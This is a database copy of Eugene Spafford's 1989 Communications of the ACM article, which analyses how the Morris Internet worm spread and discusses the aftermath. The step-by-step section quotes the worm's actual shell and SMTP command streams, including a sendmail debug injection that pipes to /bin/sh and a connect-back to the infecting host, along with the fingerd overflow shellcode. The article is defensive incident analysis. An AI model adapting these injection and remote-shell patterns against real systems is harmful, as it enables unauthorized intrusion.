<?xml version='1.0' encoding='UTF-8'?>
<DOC><DOCNO>  ZF207-331-216  </DOCNO><DOCID>07 331 216.andM;</DOCID><JOURNAL>Communications of the ACM  June 1989 v32 n6 p678(10)* Full Text COPYRIGHT Assn. for Computing Machinery, Inc. 1989.andM;</JOURNAL><TITLE>Crisis and aftermath. (the Internet worm)</TITLE><AUTHOR>Spafford, Eugene H.andM;</AUTHOR><SUMMARY>The Internet computer network was attacked on Nov 2, 1988, by acomputer worm.andP;  Although the program affected only SunMicrosystems Sun-3 workstations and VAX computers running avariant of version 4 of the Berkeley Unix, the program spread overa huge section of the network.andP;  Early the following day a numberof methods for containing and eradicating the virus had beendiscovered and published.andP;  It was discovered that the wormexploited flaws in the Unix operating system's security routinesand used some of Unix's own utilities to propagate itself.andP;  Acomplete description of the workings of the worm and its methodsof entry into Unix systems are discussed.andP;  The aftermath of theinfection and the motives of Robert T. Morris, its author, arealso discussed.andM;</SUMMARY><DESCRIPT>Topic:     Internet (Computer network)Computer virusesSoftware DesignUNIXData SecurityProgramming.andO;Feature:   illustrationcartoon.andM;</DESCRIPT><NOTE>Only Text is presented here; see printed issues for graphics.andO;</NOTE><TEXT>Crisis and Aftermath On the evening of November 2, 1988 the Internet cameunder attack from within.andP;  Sometime after 5 p.m., a program was executed onone or more hosts connected to the Internet.andP;  That program collected host,network, and user information, then used that information to break into othermachines using flaws present in those systems' software.andP;  After breaking in,the program would replicate itself and the replica would attempt to infectother systems in the same manner.andM;Although the program would only infect Sun Micro-systems' Sun 3 systems andVAX computers running variants of 4 BSD UNIX, the program spread quickly, asdid the confusion and consternation of system administrators and users asthey discovered the invasion of their systems.andP;  The scope of the break-inscame as a great surprise to almost everyone, despite the fact that UNIX haslong been known to have some security weaknesses (cf.andP;  [4, 12, 13]).andM;The program was mysterious to users at sites where it appeared.andP;  Unusualfiles were left in the /usr/tmp directories of some machines, and strangemessages appeared in the log files of some of the utilities, such as thesendmail mail handling agent.andP;  The most noticeable effect, however, was thatsystems became more and more loaded with running processes as they becamerepeatedly infected.andP;  As time went on, some of these machines bacame soloaded that they were unable to continue any processing; some machines failedcompletely when their swap space or process tables were exhausted.andM;By early Thursday morning, November 3, personnel at the University ofCalifornia at Berkeley and Massachusetts Institute of Technology (MIT) had&quot;captured&quot; copies of the program and began to analyze it.andP;  People at othersites also began to study the program and were developing methods oferadicating it.andP;  A common fear was that the program was somehow tamperingwith system resources in a way that could not be readily detected--that whilea cure was being sought, system files were being altered or informationdestroyed.andP;  By 5 a.m.andP;  Thursday morning, less than 12 hours after the programwas first discovered on the network, the Computer Systems Research Group atBerkeley had developed an interim set of steps to halt its spread.andP;  Thisincluded a preliminary patch to the sendmail mail agent.andP;  The suggestionswere published in mailing lists and on the Usenet, although their spread washampered by systems disconnecting from the Internet to attempt a&quot;quarantine.&quot;andM;By about 9 p.m.andP;  Thursday, another simple, effective method of stopping theinvading program, without altering system utilities, was discovered at Purdueand also widely published.andP;  Software patches were posted by the Berkeleygroup at the same time to mend all the flaws that enabled the program toinvade systems.andP;  All that remained was to analyze the code that caused theproblems and discover who had unleashed the worm--and why.andP;  In the weeks thatfollowed, other well-publicized computer break-ins occurred and a number ofdebates began about how to deal with the individuals staging these invasions.andO;There was also much discussion on the future roles of networks and security.andO;Due to the complexity of the topics, conclusions drawn from these discussionsmay be some time in coming.andP;  The on-going debate should be of interest tocomputer professionasl everywhere, however.andM;HOW THE WORM OPERATEDandM;The worm took advantage of some flaws in standard software installed on manyUNIX systems.andP;  It also took advantage of a mechanism used to simplify thesharing of resources in local area networks.andP;  Specific patches for theseflaws have been widely circulated in days since the worm program attached theInternet.andM;FingerdandM;The finger program is a utility that allows users to obtain information aboutother users.andP;  It is usually used to identify the full name or login name of auser, whether or not a user is currently logged in, and possibly otherinformation about the person such as telephone numbers where he or she can bereached.andP;  The fingerd program is intended to run as a daemon, or backgroundprocess, to service remote requests using the finger protocol.andP;  This daemonprogram accepts connections from remote programs, reads a single line ofinput, and then sends back output matching the received request.andM;The bug exploited to break fingerd involved overrunning the buffer the daemonused for input.andP;  The standard C language I/O library has a few routines thatread input without checking for bounds on the buffer involved.andP;  Inparticular, the gets call takes input to a buffer without doing any boundschecking; this was the call exploited by the worm.andP;  As will be explainedlater, the input overran the buffer allocated for it and rewrote the stackframe thus altering the behavior of the program.andM;The gets routine is not the only routine with this flaw.andP;  There is a wholefamily of routines in the C library that may also overrun buffers whendecoding input or formatting output unless the user explicitly specifieslimits on the number of characters to be converted.andP;  Although experienced Cprogrammers are aware of the problems with these routines, they continue touse them.andP;  Worse, their format is in some sense codified not only byhistorical inclusion in UNIX and the C language, but more formally in theforthcoming ANSI language standard for C.andP;  The hazard with these calls isthat any network server or privileged program using them may possibly becompromised by careful precalculation of the (in)appropriate input.andM;Interestingly, at least two long-standing flaws based on this underlyingproblem have recently been discovered in standard BSD UNIX commands.andP;  Programaudits by various individuals have revealed other potential problems, andmany patches have been circulated since November to deal with these flaws.andO;Unfortunately, the library routines will continue to be used, and as ourmemory of this incident fades, new flaws may be introduced with their use.andM;SendmailandM;The sendmail program is a mailer designed to route mail in a heterogeneousinternetwork.andP;  The program operates in a number of modes, but the oneexploited by the worm involves the mailer operating as a daemon (background)process.andP;  In this mode, the program is &quot;listening&quot; on a TCP port (#25) forattempts to deliver mail using the standard Internet protocol, SMTP (SimpleMail Transfer Protocol).andP;  When such an attempt is detected, the daemon entersinto a dialog with the remote mailer to determine sender, recipient, deliveryinstructions, and message contents.andM;The bug exploited in sendmail had to do with functionality provided by adebugging option in the code.andP;  The worm would issue the DEBUG command tosendmail and then specify a set of commands instead of a user address.andP;  Innormal operation, this is not allowed, but it is present in the debuggingcode to allow testers to verify that mail is arriving at a particular sitewithout the need to invoke the address resolution routines.andP;  By using thisoption, testers can run programs to display the state of the mail systemwithout sending mail or establishing a separate login connection.andP;  The debugoption is often used because of the complexity of configuring sendmail forlocal conditions, and it is often left turned on by many vendors and siteadministrators.andM;The sendmail program is of immense importance on most Berkeley-derived (andother) UNIX systems because it handles the complex tasks of mail routing anddelivery.andP;  Yet, despite its importance and widespread use, most systemadministrators know little about how it works.andP;  Stories are often relatedabout how system administrators will attempt to write new device drivers orotherwise modify the kernel of the operating system, yet they will notwillingly attempt to modify sendmail or its configuration files.andM;It is little wonder, then, that bugs are present in sendmail that allowunexpected behavior.andP;  Other flaws have been found and reported now thatattention has been focused on the program, but it is not known for sure ifall the bugs have been discovered and all the patches circulated.andM;PasswordsandM;A key attack of the worm involved attempts to discover user passwords.andP;  Itwas able to determine success because the encrypted password of each user wasin a publicly readable file.andP;  In UNIX systems, the user provides a passwordat sign-on to verify identity.andP;  The password is encrypted using a permutedversion of the Data Encryption Standard (DES) algorithm, and the result iscompared against a previously encrypted version present in a word-readableaccounting file.andP;  If a match occurs, access is allowed.andP;  No plaintextpasswords are contained in the file, and the algorithm is supposedlynoninvertible without knowledge of the password.andM;The organization of the passwords in UNIX allows nonprivileged commands tomake use of information stored in the accounts file, includingauthentification schemes using user passwords.andP;  However, it also allows anattacker to encrypt lists of possible passwords and then compare them againstthe actual passwords without calling any system function.andP;  In effect, thesecurity of the passwords is provided by the prohibitive effort of tryingthis approach with all combinations of letters.andP;  Unfortunately, as machinesget faster, the cost of such attempts decreases.andP;  Dividing the task amongmultiple processors further reduces the time needed to decrypt a password.andO;Such attacks are also made easier when users choose obvious or common wordsfor their passwords.andP;  An attacker need only try lists of common words until amatch is found.andM;The worm used such an attack to break passwords.andP;  It used lists of words,including the standard online dictionary, as potential passwords.andP;  Itencrypted them using a fast version of the password algorithm and thencompared the result against the contents of the system file.andP;  The wormexploited the accessibility of the file coupled with the tendency of users tochoose common words as their passwords.andP;  Some sites reported that over 50percent of their passwords were quickly broken by this simple approach.andM;One way to reduce the risk of such attacks, and an approach that has alreadybeen taken in some variants of UNIX, is to have a shadow password file.andP;  Theencrypted passwords are saved in a file (shadow) that is readable only by thesystem administrators, and a privileged call performs password encryptionsand comparisons with an appropriate timed delay (0.5 to 1 second, forinstance).andP;  This would prevent any attempt to &quot;fish&quot; for passwords.andO;Additionally, a threshold could be included to check for repeated passwordattempts from the same process, resulting in some form of alarm being raised.andO;Shadow password files should be used in combination with encryption ratherthan in place of such techniques, however, or one problem is simply replacedby a different one (securing the shadow file); the combination of the twomethods is stronger than either one alone.andM;Another way to strengthen the password mechanism would be to change theutility that sets user passwords.andP;  The utility currently makes a minimalattempt to ensure that new passwords are nontrivial to guess.andP;  The programcould be strengthened in such a way that it would reject any choice of a wordcurrently in the online dictionary or based on the account name.andM;A related flaw exploited by the worm involved the use of trusted logins.andP;  Oneof the most useful features of BSD UNIX-based networking code is the abilityto execute tasks on remote machines.andP;  To avoid having to repeatedly typepasswords to access remote accounts, it is possible for a user to specify alist of host/login name pairs that are assumed to be &quot;trusted,&quot; in the sensethat a remote access from that host/login pair is never asked for a password.andO;This feature has often been responsible for users gaining unauthorized accessto machines (cf.andP;  [11]), but it continues to be used because of its greatconvenience.andM;The worm exploited the mechanism by locating machines that might &quot;trust&quot; thecurrent machine/login being used by the worm.andP;  This was done by examiningfiles that listed remote machine/logins used by the host.andP;  Often, machinesand accounts are reconfigured for reciprocal trust.andP;  Once the worm found suchlikely candidates, it would attempt to instantiate itself on those machinesby using the remote execution facility--copying itself to the remote machinesas if it were an authorized user performing a standard remote operation.andM;To defeat such future attempts requires that the current remote accessmechanism be removed and possibly replaced with something else.andP;  Onemechanism that shows promise in this area is the Kerberos authenticationserver.andP;  This scheme uses dynamic session keys that need to be updatedperiodically.andP;  Thus, an invader could not make use of static authorizationspresent in the file system.andM;High Level DescriptionandM;The worm consisted of two parts: a main program, and a bootstrap or vectorprogram.andP;  The main program, once established on a machine, would collectinformation on other machines in the network to which the current machinecould connect.andP;  It would do this by reading public configuration files and byrunning system utility programs that present information about the currentstate of network connections.andP;  It would then attempt to use the flawsdescribed above to establish its bootstrap on each of those remote machines.andM;The worm was brought over to each machine it infected via the actions of asmall program commonly referred to as the vector program or as the grapplinghook program.andP;  Some people have referred to it as the l1.c program, sincethat is the file name suffix used on each copy.andM;This vector program was 99 lines of C code that would be compiled and run onthe remote machine.andP;  The source for this program would be transferred to thevictim machine using one of the methods discussed in the next section.andP;  Itwould then be compiled and invokedon the victim machine with three commandline arguments: the network address of the infecting machine, the number ofthe network port to connect to on that machine to get copies of the main wormfiles, and a magic number that effectively acted as a one-time-challengepassword.andP;  If the &quot;server&quot; worm on the remote host and port did not receivethe same magic number back before starting the transfer, it would immediatelydisconnect from the vector program.andP;  This may have been done to preventsomeone from attempting to &quot;capture&quot; the binary files by spoofing a worm&quot;server.&quot;andM;This code also went to some effort to hide itself, both by zeroing out itsargument vector (command line image), and by immediately forking a copy ofitself.andP;  If a failure occurred in transferring a file, the code deleted allfiles it had already transferred, then it exited.andM;Once established on the target machine, the bootstrap would connect back tothe instance of the worm that originated it and transfer a set of binaryfiles (precompiled code) to the local machine.andP;  Each binary file representeda version of the main worm program, compiled for a particular computerarchitecture and operating system version.andP;  The bootstrap would also transfera copy of itself for use in infecting other systems.andP;  One curious feature ofthe bootstrap has provoked many questions, as yet unanswered: the program haddata structures allocated to enable transfer of up to 20 files; it was usedwith only three.andP;  this has led to speculation whether a more extensiveversion of the worm was planned for a later date, and if that version mighthave carried with it other command files, password data, or possibly localvirus or trojan horse programs.andM;Once the binary files were transferred, the bootstrap program would load andlink these files with the local versions of the standard libraries.andP;  Oneafter another, these programs were invoked.andP;  If one of them ran successfully,it read into its memory copies of the bootstrap and binary files and thendeleted the copies on disk.andP;  It would then attempt to break into othermachines.andP;  If none of the linked versions ran, then the mechanism running thebootstrap (a command file or the parent worm) would delete all the disk filescreated during the attempted infection.andM;Step-by-Step DescriptionandM;This section contains a more detailed overview of how the worm programfunctioned.andP;  The description in this section assumes that the reader issomewhat familiar with standard UNIX commands and with BSD UNIX networkfacilities.andP;  A more detailed analysis of operation and components can befound in [16], with additional details in [3] and [15].andM;This description starts from the point at which a host is about to beinfected.andP;  At this point, a worm running on another machine has eithersucceeded in establishing a shell on the new host and has connected back tothe infecting machine via a TCP connection, or it has connected to the SMTPport and is transmitting to the sendmail program.andP;  The infection proceeded asfollows:andM;1.andP;  A socket was established on the infecting machine for the vector programto connect to (e.g., socket number 32341).andP;  A challenge string wasconstructed from a random number (e.g., 8712440).andP;  A file name base was alsoconstructed using a random number (e.g., 14481910).andM;2.andP;  The vector program was installed and executed using one of two methods:andM;a.andP;  Across a TCP connection to a shell, the worm would send the followingcommands (the three lines beginning with &quot;cc&quot; and the two lines beginningwith &quot;echo&quot; were sent as a single line): PATH=/bin:/usr/bin:/usr/ucb cd;/usr/tmp echo gorch49; sed '/int zz/q' andgt; x14481910.c; echo gorch50 [text ofvector program] int zz; cc -o z14481910 x14481910.c;./x14481910 128.32.134.1632341 8712440; rm -f x14481910 x14481910.c; echo DONEandM;Then it would wait for the string &quot;DONE&quot; to signal that the vector programwas running.andM;b.andP;  Using the SMTP connection, it would transmit (the three lines beginningwith &quot;cc&quot; and the two lines beginning with &quot;rcpt&quot; were sent as a singleline): debug mail from: andless;/dev/nullandgt; rcpt to: andless;&quot;!sed -e '1,/*$/'d! /bin/sh;exit 0&quot;andgt; data cd /usr/tmp cat andgt; x14481901.c andless;andless; 'EOF' [text of vector program]EOF cc -o x14481910 x14481910.c; x14481910 128.32.134.16 32341 8712440; rm -fx14481910 x14481910.c quitandM;The infecting worm would then wait for up to two minutes on the designatedport for the vector to contact it.andM;3.andP;  The vector program then connected to the &quot;server,&quot; sent the challengestring, and transferred three files: a Sun 3 binary version of the worm, aVAX version, and the source code for the vector program.andP;  After the fileswere copied, the running vector program became (via the execl call) a shellwith its input and output still connected to the server worm.andM;4.andP;  The server worm sent the following command stream to the connected shell:PATH=/bin:/usr/bin:/usr/ucb rm -f sh if [ -f sh ] then P=x14481910 else P=shfiandM;Then, for each binary file it had transferred (just two in this case,although the code is written to allow more), it would send the following formof command sequence: cc -o $P x14481910, sun3.o ./$P -p $$ x14481910,sun3.ox14481910,vax.o x14481910,11.c rm -f $PandM;The rm would succeed only if the linked version of the worm failed to startexecution.andP;  If the server determined that the host was now infected, itclosed the connection.andP;  Otherwise, it would try the other binary file.andP;  Afterboth binary files had been tried, it would send over rm commands for theobject files to clear away all evidence of the attempt at infection.andM;5.andP;  The new worm on the infected host proceeded to &quot;hide&quot; itself by obscuringits argument vector, unlinking the binary version of itself, and killing itsparent (the $$ argument in the invocation).andP;  It then read into memory each ofthe worm binary files, encrypted each file after reading it, and deleted thefiles from disk.andM;6.andP;  Next, the worm gathered information about network interfaces and hosts towhich the local machine was connected.andP;  It built lists of these in memory,including information about canonical and alternate names and addresses.andP;  Itgathered some of this information by making direct ioctl calls, and byrunning the netstat program with various arguments.andP;  It also read throughvarious system files looking for host names to add to its database.andM;7.andP;  It randomized the lists it constructed, then attempted to infect some ofthose hosts.andP;  For directly connected networks, it created a list of possiblehost numbers and attempted to infect those hosts if they existed.andP;  Dependingon the type of host (gateway or local network), the worm first tried toestablish a connection on the telnet or rexec ports to determine reachabilitybefore it attempted one of the infection methods.andM;8.andP;  The infection attempts proceeded by one of three routes: rsh, fingerd, orsendmail.andM;a.andP;  The attack via rsh was done by attempting to spawn a remote shell byinvocation of (in order of trial) /usr/ucb/rsh, /usr/bin/rsh, and /bin/rsh.andO;If successful, the host was infected as in steps 1 and 2(a).andM;b.andP;  The attack via the finger daemon was somewhat more subtle.andP;  A connectionwas established to the remote finger server daemon and then a speciallyconstructed string of 536 bytes was passed to the daemon, overflowing itsinput buffer and overwriting parts of the stack.andP;  For standard 4BSD versionsrunning on VAX computers, the overflow resulted in the return stack frame forthe main routine being changed so that the return address pointed into thebuffer on the stack.andP;  The instructions that were written into the stack atthat location were: pushl $68732f '/sh\0' pushl $6e69622f '/bin' movl sp, r10pushl $0 pushl $0 pushl r10 pushl $3 movl sp,ap chmk $3bandM;That is, the code executed when the main routine attempted to return was:execve(&quot;/bin/sh&quot;, 0, 0)andM;On VAXs, this resulted in the worm connected to a remote shell via the TCPconnection.andP;  The worm then proceeded to infect the host as in steps 1 and2(a).andP;  On Suns, this simply resulted in a core dump since the code was not inplace to corrupt a Sun version of fingerd in a similar fashion.andP;  Curiously,correct machine-specific code to corrupt Suns could have been written in amatter of hours and included, but was not [16].andM;c.andP;  The worm then tried to infect the remote host by establishing aconnection to the SMTP port and mailing an infection, as in step 2(b).andM;Not all the steps were attempted.andP;  As soon as one method succeeded, the hostentry in the internal list was marked as infected and the other methods werenot attempted.andM;9.andP;  Next, it entered a state machine consisting of five states.andP;  Each statebut the last was run for a short while, then the program looped back to step7 (attempting to break into other hosts via sendmail, finger, or rsh).andP;  Thefirst four of the five states were attempts to break into user accounts onthe local machine.andP;  The fifth state was the final state, and occurred afterall attempts had been made to break all passwords.andP;  In the fifth state, theworm looped forever trying to infect hosts in its internal tables and markedas not yet infected.andP;  The first four states were:andM;a.andP;  The worm read through the /etc/hosts.equiv files and /.rhosts files tofind the names of equivalent hosts.andP;  These were marked in the internal tableof hosts.andP;  Next, the worm read the /etc/passwd (the account and passwordfile) file into an internal data structure.andP;  As it was doing this, it alsoexamined the .forward file (used to forward mail to a different hostautomatically) in each user home directory and included those host names inits internal table of hosts to try.andP;  Oddly, it did not similarly check user.rhosts files.andM;b.andP;  The worm attempted to break each user password using simple choices.andP;  Theworm first checked the obvious case of no password.andP;  Then, it used theaccount name and user information field to try simple passwords.andP;  Assume thatthe user had an entry in the password file like:account:abcdefghijklm:100:5:User, Name:/usr/account:/bin/shandM;(These represent, respectively, the account name, the encrypted password, theuser ID number, the user's default group ID number, per-user informationfield, the pathname of the user's home account, and the pathname of theuser's default command interpreter or shell.)andP;  The words tried as potentialpasswords would be account, accountaccount, User, Name, user, name, andtnuocca.andP;  These are, respectively, the account name, the account nameconcatenated with itself, the first and last names of the user, the usernames with leading capital letters turned to lowercase, and the account namereversed.andP;  Experience described in [4] indicates that on systems where usersare naive about password security, these choices may work for a significantpercentage of user accounts.andM;Step 10 describes what was done if a password &quot;hit&quot; was achieved.andM;c.andP;  The third stage in the process involved trying to break the password ofeach user by trying each word present in an internal dictionary of words.andO;This dictionary of 432 words was tried against each account in a randomorder, with password &quot;hits&quot; being handled as described in step 10.andP;  (Thecomplete dictionary is given in [16].)andM;d.andP;  The fourth stage was entered if all other attempts failed.andP;  For each wordin the UNIX online dictionary, the worm would see if it was the password toany account.andP;  In addition, if the word in the dictionary began with anuppercase letter, the letter was converted to lowercase and that word wasalso tried against all the passwords.andM;10.andP;  Once a password was broken for any account, the worm would attempt tobreak into remote machines where that user had accounts.andP;  The worm would scanthe .forward and .rhosts files of the user at this point, and identify thenames of remote hosts that had accounts used by the target user.andP;  It thenattempted two attacks:andM;a.andP;  The worm would first attempt to create a remote shell using the rexecservice.andP;  The attempt would be made using the account name given in the.forward or .rhosts file and the user's local password.andP;  This took advantageof the fact that users often have the same password on their accounts onmultiple machines.andM;b.andP;  The worm would do a rexec to the current host (using the local user nameand password) and would try a rsh command to the remote host using theusername taken from the file.andP;  This attack would succeed in those cases wherethe remote machine had a hosts.equiv file or the user had a .rhosts file thatallowed remote execution without a password.andM;If the remote shell was created either way, the attack would continue as insteps 1 and 2(a).andP;  No other use was made of the user password.andM;Throughout the execution of the main loop, the worm would check for otherworms running on the same machine.andP;  To do this, the worm would attempt toconnect to another worm on a local, predetermined TCP socket.andP;  If such aconnection succeeded, one worm would (randomly) set its pleasequit variableto 1, causing that worm to exit after it had reached part way into the thirdstage (9c) of password cracking.andP;  This delay is part of the reason manysystems had multiple worms running: even though a worm would check for otherlocal worms, it would defer its self-destruction until significant effort hadbeen made to break local passwords.andP;  Furthermore, race conditions in the codemade it possible for worms on heavily loaded machines to fail to connect,thus causing some of them to continue indefinitely despite the presence ofother worms.andM;One out of every seven worms would become immortal rather than check forother local worms.andP;  Based on a generated random number they would set aninternal flag that would prevent them from ever looking for another worm ontheir host.andP;  This may have been done to defeat any attempt to put a fake wormprocess on the TCP port to kill existing worms.andP;  Whatever the reason, thiswas likely the primary cause of machines being overloaded with multiplecopies of the worm.andM;The worm attempted to send an UDP packet to the host ernie.berkeley.eduapproximately once every 15 infections, based on a random number comparison.andO;The code to do this was incorrect, however, and no information was ever sent.andO;Whether this was an intended ruse or whether there was actually some reasonfor the byte to be sent is not currently known.andP;  However, the code is suchthat an uninitialized byte is the intended message.andP;  It is possible that theauthor eventually intended to run some monitoring program on ernie (afterbreaking into an account, perhaps).andP;  Such a program could obtain the sendinghost number from the single-byte message, whether it was sent as a TCP or UDPpacket.andP;  However, no evidence for such a program has been found and it ispossible that the connection was simply a feint to cast suspicion onpersonnel at Berkeley.andM;The worm would also fork itself on a regular basis and kill its parent.andP;  Thisserved two purposes.andP;  First, the worm appeared to keep changing its processidentifier and no single process accumulated excessive amounts of CPU time.andO;Secondly, processes that have been running for a long time have theirpriority downgraded by the scheduler.andP;  By forking, the new process wouldregain normal scheduling priority.andP;  This mechanism did not always workcorrectly, either, as we locally observed some instances of the worm withover 600 seconds of accumulated CPU time.andM;If the worm ran for more than 12 hours, it would flush its host list of allentries flagged as being immune or already infected.andP;  The way hosts wereadded to this list implies that a single worm might reinfect the samemachines every 12 hours.andM;AFTERMATHandM;In the weeks and months following the release of the Internet worm, therehave been a number of topics hotly debated in mailing lists, media coverage,and personal conversations.andP;  I view a few of these as particularlysignificant, and will present them here.andM;Author, Intent, and PunishmentandM;Two of the first questions to be asked--even before the worm wasstopped--were simply the questions who and why.andP;  Who had written the worm,and why had he/she/they loosed it upon the Internet?andP;  The question of who wasanswered quite shortly thereafter when the New York Times identified RobertT. Morris.andP;  Although he has not publicly admitted authorship, and no court oflaw has yet pronounced guilt, there seems to be a large body of evidence tosupport such an identification.andM;Various officials have told me that they have obtained statements frommultiple individuals to whom Morris spoke about the worm and its development.andO;They also have records from Cornell University computers showing earlyversions of the worm code being tested on campus machines.andP;  They also havecopies of the worm code, found in Morris' account.andM;Thus, the identity of the author seems fairly well-established.andP;  But hismotive remains a mystery.andP;  Speculation has ranged from an experiment goneawry to an unconscious act of revenge against his father, who is the NationalComputer Security Center's chief scientist.andP;  All of this is sheerspeculation, however, since no statement has been forthcoming from Morris.andO;All we have to work with is the decompiled code for the program and ourunderstanding of its effects.andP;  It is impossible to intuit the real motivefrom those or from various individuals' experiences with the author.andP;  We mustawait a definitive statement by the author to answer the question why?andO;Considering the potential legal consequences, both criminal and civil, adefinitive statement from Morris may be some time in coming, if it ever does.andM;Two things have impressed many people (this author included) who have readthe decompiled code.andP;  First, the worm program contained no code to explicitlydamage any system on which it ran.andP;  Considering the ability and knowledgeevidenced by the code, it would have been a simple matter for the author tohave included such commands if that was his intent.andP;  Unless the worm wasreleased prematurely, it appears that the author's intent did not involvedestruction or damage of any data or system.andM;The second feature of note was that the code had no mechanism to halt thespread of the worm.andP;  Once started, the worm would propagate while also takingsteps to avoid identification and capture.andP;  Due to this and the complexargument string necessary to start it, individuals who have examined the worm(this author included) believe it unlikely that the worm was started byaccident or was not intended to propagate widely.andM;In light of our lack of definitive information, it is puzzling to noteattempts to defend Morris by claiming that his intent was to demonstratesomething about Internet security, or that he was trying a harmlessexperiment.andP;  Even the president of the ACM, Bryan Kocher, stated that it wasa prank in [7].andP;  It is curious that this many people, both journalists andcomputer professionals alike, would assume to know the intent of the authorbased on the observed behavior of the program.andP;  As Rick Adams of the Centerfor Seismic Studies observed in a posting to the Usenet, we may someday hearthat the worm was actually written to impress Jodie Foster--we simply do notknow the real reason.andM;Coupled with this tendency to assume motive, we have observed very differentopinions on the punishment, if any, to mete out to the author.andP;  Oneoft-expressed opinion, especially by those individuals who believe the wormrelease was an accident or an unfortunate experiment, is that the authorshould not be punished.andP;  Some have gone so far as to say that the authorshould be rewarded and the vendors and operators of the affected machinesshould be the ones punished, this on the theory that they were sloppy abouttheir security and somehow invited the abuse!andM;The other extreme school of thought holds that the author should be severelypunished, including a term in a federal penitentiary.andP;  (One somewhat humorousexample of this point of view was espoused by syndicated columnist MikeRoyko.)andM;As has been observed in both [2] and [6], it would not serve us well tooverreact to this particular incident.andP;   However, neither should we dismissit as something of no consequence.andP;  The fact that there was no damage donemay have been an accident, and it is possible that the author intended forthe program to clog the Internet as it did.andP;  Furthermore, we should be waryof setting dangerous precedent for this kind of behavior.andP;  Excusing acts ofcomputer vandalism simply because the authors claim there was no intent tocause damage will do little to discourage repeat offenses, and may, in fact,encourage new incidents.andM;The claim that the victims of the worm were somehow responsible for theinvasion of their machines is also curious.andP;  The individuals making thisclaim seem to be stating that there is some moral or legal obligation forcomputer users to track and install every conceivable security fix andmechanism available.andP;  This completely ignores the fact that many sites runturnkey systems without source code or knowledge of how to modify theirsystems.andP;  Those sites may also be running specialized software or haverestricted budgets that prevent them from installing new software versions.andO;Many commercial and government sites operate their systems in this way.andP;  Toattempt to blame these individuals for the success of the worm is equivalentto blaming an arson victim for the fire because she didn't build her house offireproof metal.andP;  (More on this theme can be found in [17].)andM;The matter of appropriate punishment will likely be decided by a federaljudge.andP;  A grand jury in Syracuse, N.Y., has been hearing testimony on thematter.andP;  A federal indictment under the United States Code, Title 18, Section1030 (the Computer Crime statute), parts (a)(3) or (a)(5) might be returned.andO;Section (a)(5), in particular, is of interest.andP;  That part of the statutemakes it a felony if an individual &quot;intentionally accesses a federal interestcomputer without authorization, and by means of one or more instances of suchconduct alters, damages, or destroys information .andP;  .  .  , or preventsauthorized use of any such computer or information and thereby causes loss toone or more others of a value aggregating $1,000 or more during any one yearperiod&quot; (emphasis added).andP;  State and civil suits might also be brought inthis case.andM;Worm HuntersandM;A significant conclusion reached at the NCSC post-mortem workshop was thatthe reason the worm was stopped so quickly was due almost solely to the UNIX&quot;old-boy&quot; network, and not due to any formal mechanism in place at the time.andO;A recommendation from that workshop was that a formal crisis center beestablished to deal with future incidents and to provide a formal point ofcontact for individuals wishing to report problems.andP;  No such center wasestablished at that time.andM;On November 29, 1988, someone exploiting a security flaw present in olderversions of the FTP file transfer program broke into a machine on the MILNET.andO;The intruder was traced to a machine on the Arpanet, and to immediatelyprevent further access, the MILNET/Arpanet links were severed.andP;  During thenext 48 hours there was considerable confusion and rumor about thedisconnection, fueled in part by the Defense Communication Agency's attemptto explain the disconnection as a &quot;test&quot; rather than as a security problem.andM;This event, coming as close as it did to the worm incident, prompted DARPA toestablish the CERT--the Computer Emergency Response Team--at the SoftwareEngineering Institute at Carnegie Mellon University.andP;  The purpose of CERT isto act as a central switchboard and coordinator for computer securityemergencies on Arpanet and MILnet computers.andP;  The Center has asked forvolunteers from federal agencies and funded laboratories to serve astechnical advisors when needed.andM;Of interest here is that CERT is not chartered to deal with any Internetemergency.andP;  Thus, problems detected in the CSnet, Bitnet, NSFnet, and otherInternet communities may not be referable to the CERT.andP;  I was told that it isthe hope of CERT personnel that these other networks will develop their ownCERT-like groups.andP;  This, of course, may make it difficult to coordinateeffective action and communication during the next threat.andP;  It may evenintroduce rivalry in the development and dissemination of criticalinformation.andM;Also of interest is the composition of the personnel CERT is enlisting asvolunteers.andP;  Apparently there has been little or no solicitation of expertiseamong the industrial and academic computing communities.andP;  This is preciselywhere the solution to the worm originated.andP;  The effectiveness of thisorganization against the next Internet-wide crisis will be interesting tonote.andM;CONCLUSIONSandM;All the consequences of the Internet worm incident are not yet known; theymay never be.andP;  Most likely there will be changes in security consciousnessfor at least a short period of time.andP;  There may also be new laws and newregulations from the agencies governing access to the Internet.andP;  Vendors maychange the way they test and market their products--and not all of thepossible changes will be advantageous to the end-user (e.g., removing themachine/host equivalence feature for remote execution).andP;  Users' interactionswith their systems may change as well.andP;  It is also possible that nosignificant change will occur anywhere.andP;  The final benefit or harm of theincident will only become clear with the passage of time.andM;It is important to note that the nature of both the Internet and UNIX helpedto defeat the worm as well as spread it.andP;  The immediacy of communication, theability to copy source and binary files from machine to machine, and thewidespread availability of both source and expertise allowed personnelthroughout the country to work together to solve the infection despite thewidespread disconnection of parts of the network.andP;  Although the immediatereaction of some people might be to restrict communication or promote adiversity of incompatible software options to prevent a recurrence of a worm,that would be an inappropriate reaction.andP;  Increasing the obstacles to opencommunication or decreasing the number of people with access to in-depthinformation will not prevent a determined hacker--it will only decrease thepool of expertise and resources available to fight such an attack.andP;  Further,such an attitude would be contrary to the whole purpose of having an open,research-oriented network.andP;  The worm was caused by a breakdown of ethics aswell as lapses in security--a purely technological attempt at prevention willnot address the full problem, and may just cause new difficulties.andM;What we learn from this about securing our systems will help determine ifthis is the only such incident we ever need to analyze.andP;  This attack shouldalso point out that we need a better mechanism in place to coordinateinformation about security flaws and attacks.andP;  The response to this incidentwas largely ad hoc, and resulted in both duplication of effort and a failureto disseminate valuable information to sites that needed it.andP;  Many siteadministrators discovered the problem from reading newspapers or watchingtelevision.andP;  The major sources of information for many of the sites affectedseems to have been Usenet news groups and a mailing list I put together whenthe worm was first discovered.andP;  Although useful, these methods did not ensuretimely, widespread dissemination of useful information--especially since theydepended on the Internet to work!andP;  Over three weeks after this incident somesites were still not reconnected to the Internet.andP;  The worm has shown us thatwe are all affected by events in our shared environment, and we need todevelop better information methods outside the network before the nextcrisis.andP;  The formation of the CERT may be a step in the right direction, buta more general solution is still needed.andM;Finally, this whole episode should prompt us to think about the ethics andlaws concerning access to computers.andP;  The technology we use has developed soquickly it is not always easy to determine where the proper boundaries ofmoral action should be.andP;  Some senior computer professionals started theircareers years ago by breaking into computer systems at their colleges andplaces of employment to demonstrate their expertise and knowledge of theinner workings of the systems.andP;  However, times have changed and mastery ofcomputer science and computer engineering now involves a great deal more thancan be shown by using intimate knowledge of the flaws in a particularoperating system.andP;  Whether such actions were appropriate fifteen years agois, in some senses, unimportant.andP;  I believe it is critical to realize 